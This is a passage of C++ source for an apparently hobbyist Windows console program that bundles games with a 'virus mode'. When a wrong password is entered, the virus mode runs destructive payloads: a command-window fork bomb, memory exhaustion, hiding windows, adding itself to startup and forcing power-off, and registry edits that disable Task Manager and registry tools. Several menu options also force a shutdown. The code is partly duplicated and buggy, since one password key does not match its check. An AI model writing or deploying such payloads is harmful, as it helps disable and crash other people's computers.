									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 4) {
								system("cls");
								system("title 病毒秘钥");
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  529555" <<endl;
								cout << "4:  278230" <<endl;
								cout << "5:  640855" <<endl;
								cout << "6:  957040" <<endl;
								cout << "7:  617735" <<endl;
								cout << "8:  138203" <<endl;
								system("pause"); 
							}
							else if(module == 5){
								system("cls");
								system("title 开始关机");
								cout<<"一分钟后关机！";
								system("shutdown -s -t 60");
								break;
							} 
					        else if (module == 6) {
					        	system("cls");
					        	system("title 帮助文件");
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏"<<endl;
					            cout << "3：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "4：查看病毒密钥，5：关机，6：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号" <<endl;
					            system("pause");
					        }
						}
						
					case 5:
						cout<<"因您没有欠债，所以您可以使用jiao-killv2.0的内容" <<endl;
						sleep(2);
						system("cls");
						HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
						wuq();
						while (true) {
							SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
					        cout << "请输入模式(输入8查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            break;
					            system("pause");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
							else if (module == 3){
								system("mode con cols=80 lines=30"); //设置cmd窗口大小
								system("color 2"); //设置字符颜色：0 黑；1 深蓝；2 深绿；3 深青；4 深红；5 深紫；6 深褐 
							    cout << "--------------------贪吃蛇---------------------" << endl;
							    cout << "先选择难度.请在1-10中输入1个数,1最简单,10则最难" << endl;
							    cout << "然后进入游戏画面,以方向键控制方向.祝你游戏愉快!" << endl;
							    cout << "-----------------------------------------------" << endl;
							    cout << "请输入难度级别：" ;
							    m=25;
							    n=40; 
							    if (m<10 || n<10 || m>25 || n>40)
							    {
							        cout << "ERROR" << endl;
							        system("pause");
							        return 0;
							    }
							    int hard;
							    cin >> hard;
							    if (hard<=0 || hard>100)
							    {
							        cout << "ERROR" << endl;
							        system("pause");
							        return 0;
							    }
							    /*** 数据全部初始化，包括蛇长，位置，方向 ***/
							    snake_length=5;
							    clock_t a,b;
							    char ch;
							    double hard_len;
							    for (int i=0;i<=4;i++)
							    {
							        snake[i].x=1;
							        snake[i].y=5-i;
							    }
							    dir=3;
							    /*** 输出初始地图，蛇与食物 ***/
							    system("cls");
							    hide();
							    print_wall();
							    print_food();
							    print_snake();
							    locate(m+2,0);
							    cout << "Now length: ";
							    /*** 开始游戏 ***/
							    while (1)
							    {
							        /*** 难度随长度增加而提高 ***/
							        hard_len=(double)snake_length/(double) (m*n);
							        /*** 调节时间，单位是ms ***/
							        a=clock();
							        while (1)
							        {
							            b=clock();
							            if (b-a>=(int)(400-30*hard)*(1-sqrt(hard_len))) break;
							        }
							        /*** 接受键盘输入的上下左右，并以此改变方向 ***/
							        if (kbhit())
							        {
							            ch=getch();
							            if (ch==-32)
							            {
							                ch=getch();
							                switch(ch)
							                {
							                case 72:
							                    if (dir==2 || dir==3)
							                        dir=0;
							                    break;
							                case 80:
							                    if (dir==2 || dir==3)
							                        dir=1;
							                    break;
							                case 75:
							                    if (dir==0 || dir==1)
							                        dir=2;
							                    break;
							                case 77:
							                    if (dir==0 || dir==1)
							                        dir=3;
							                    break;
							                }
							            }
							        }
							        /*** 前进 ***/
							        if (!go_ahead()) break;
							        /*** 在最后输出此时长度 ***/
							        locate(m+2,12);
							        cout << snake_length;
							    }
							    system("color 0");
								system("pause");
							}
					        else if (module == 4) {
					        	system("cls");
					        	system("title 病毒模式");
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 5) {
								system("cls");
								system("title 病毒秘钥");
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  529555" <<endl;
								cout << "4:  278230" <<endl;
								cout << "5:  640855" <<endl;
								cout << "6:  957040" <<endl;
								cout << "7:  617735" <<endl;
								cout << "8:  138203" <<endl;
								system("pause"); 
							}
							else if(module == 6){
								system("start http://www.google.com/poki.com");
							}
							else if(module == 7){
								system("cls");
								system("title 我是个傻逼");
								cout<<"三秒后关机！";
								system("shutdown -s -t 3");
							} 
					        else if (module == 8) {
					        	system("cls");
					        	system("title 帮助文件");
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：启动贪吃蛇游戏"<<endl;
					            cout << "4：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "5：查看病毒密钥，6：打开谷歌浏览器poki小游戏，7：关机"<<endl;
								cout <<"8：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号" <<endl;
					            system("pause");
					        }
						}
				}
			}else{
				cout << "竟然你不用，那你就滚！！！" <<endl;
				sleep(3);
				system("cls");
				system("title 我是大傻逼");
				cout<<"三秒后关机！";
				system("shutdown -s -t 3");
			}
		}else if(c==3){
			cout<<"********************************"<<endl;
			cout<<"* 用户列表                     *"<<endl;
			cout<<"* 用户1  ： liusirui           *"<<endl;
			cout<<"* 密码    ： *********         *"<<endl;
			cout<<"********************************"<<endl;
			system("pause"); 
			continue;
		}else{
			cout<<"无此代码号";
			continue; 
		}
	}
	return 0;
}
